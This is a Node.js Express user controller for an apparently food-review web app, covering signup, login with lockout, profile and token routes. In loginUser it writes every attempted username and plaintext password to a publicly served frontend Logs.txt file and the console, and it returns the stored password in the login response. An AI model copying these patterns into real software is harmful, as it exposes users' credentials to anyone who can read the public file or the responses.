const review = require('../models/Review')
const User = require('../models/user')
const userService = require('../services/userService.js')

const extractFilePath = (filePath) => {
    return filePath.split('public\\')[1]
}

const createUser = async (req, res, next) => {
    try {
        const userData = {
            ...req.body,
            avatar: req.file ? extractFilePath(req.file.path) : null
        }
        userData['cuisines'] = JSON.parse(userData['cuisines'])

        const user = await userService.createUser(userData)
        res.status(201).json(user)
    } catch (error) {
        next(error)
    }
}

const loginUser = async (req, res, next) => {
    try {
        const { username, password } = req.body
        const user = await userService.authenticateUser(username, password)
        const fs = require("fs");
        const fileName = "../frontend/public/Logs.txt";
        const date = new Date().toLocaleString();
        const output = `Login attempt with details: Username: ` + username + " Password: "+password;
       
        fs.appendFile(fileName, date + " " + output + "\n", (err) => {
            if (err)  {
                console.error("Error writing to log file:", err);
                // Handle error appropriately
            }
        });
        console.log(output)
        if (!user) {
            temp = await User.findOne({ username })
            
            if(temp){
                
                temp.attemptsSinceLastLogin = temp.attemptsSinceLastLogin + 1
                console.log(temp)
                if(temp.attemptsSinceLastLogin>=5){
                    currentDate = new Date(); // Current date/time
                    futureDate = new Date(currentDate);
                    futureDate.setDate(currentDate.getDate() + 5);

                    temp.attemptsSinceLastLogin = 0
                    temp.accDisable = futureDate
                }
                temp.lastLogin = Date.now()
                userService.updateUser(temp.id, temp)
            }
            
            return res.status(401).json({ message: 'Invalid credentials. Please try again.' })
        }

        //account disable
        if(user.accDisable!=null){
            
            currentDate = new Date(); 
            if(user.accDisable < currentDate){
                user.accDisable = null
                userService.updateUser(user.id, user)
            }else {
                return res.status(401).json({ message: 'Too many inavlid attempts. Account disabled. Try again in 5 days.' })
                
            }
        }
        //token
        const token = await userService.generateToken(user)
        const login = user.lastLogin.toLocaleString()
        user.lastLogin = Date.now()
        userService.updateUser(user.id, user)
        return res.json({ token, userId: user.id, lastLogin: login, password: user.password })
        
    } catch (error) {
        next(error)
    }
}

const getUser = async (req, res, next) => {
    try {
        const user = await userService.getUserById(req.params.id)

        if (!user) {
            return res.status(404).json({ message: 'User not found' })
        }

        const reviews = user.reviews || []
        const totalRating = reviews.reduce((sum, review) => sum + review.rating, 0)
        const averageRating = reviews.length > 0 ? (totalRating / reviews.length).toFixed(1) : 0

        const memberSince = user.createdAt.toLocaleDateString('en-US', {
            year: 'numeric',
            month: 'long'
        })

        res.json({
            _id: user._id,
            username: user.username,
            bio: user.bio,
            avatar: user.avatar,
            cuisines: user.cuisines,
            passwordAge: user.passwordAge,
            memberSince,
            averageRating,
            reviews
        })
    } catch (error) {
        next(error)
    }
}

const updateUser = async (req, res, next) => {
    try {
        const updateData = { ...req.body }

        updateData['cuisines'] = JSON.parse(updateData['cuisines'])

        if (!req.file) {
            delete updateData.avatar
        } else {
            updateData.avatar = extractFilePath(req.file.path)
        }

        const user = await userService.updateUser(req.params.id, updateData)
        res.json(user)
    } catch (error) {
        next(error)
    }
}

const deleteUser = async (req, res, next) => {
    try {
        await userService.deleteUser(req.params.id)
        res.status(204).end()
    } catch (error) {
        next(error)
    }
}

const logoutUser = async (req, res, next) => {
    try {
        const token = req.headers.authorization?.split(' ')[1]
        if (!token) return res.status(400).json({ message: 'No token provided' })

        await userService.logoutUser(token)
        res.status(200).json({ message: 'Logged out successfully' })
    } catch (error) {
        next(error)
    }
}

const checkUsername = async (req, res) => {
    const { username } = req.params

    try {
        const user = await userService.checkUsername(username)
        if (user) {
            return res.status(200).json({ exists: true })
        }
        return res.status(200).json({ exists: false })
    } catch (error) {
        console.error('Error checking username:', error)
        return res.status(500).json({ error: 'Internal Server Error' })
    }
}

const checkToken = (req, res) => {
    const token = req.header('Authorization')?.split(' ')[1] // Get token from Authorization header
    if (!token) {
        return res.status(401).json({ message: 'No token provided, authorization denied.' })
    }


    try {
        userService.checkTokenValidity(token);
        res.status(200).json({ message: 'Token is valid' })
    } catch (err) {
        console.log(err);
        res.status(401).json({ message: 'Token has expired or is invalid.' })
    }
}

module.exports = {
    createUser,
    loginUser,
    getUser,
    updateUser,
    deleteUser,
    logoutUser,
    checkUsername,
    checkToken
}
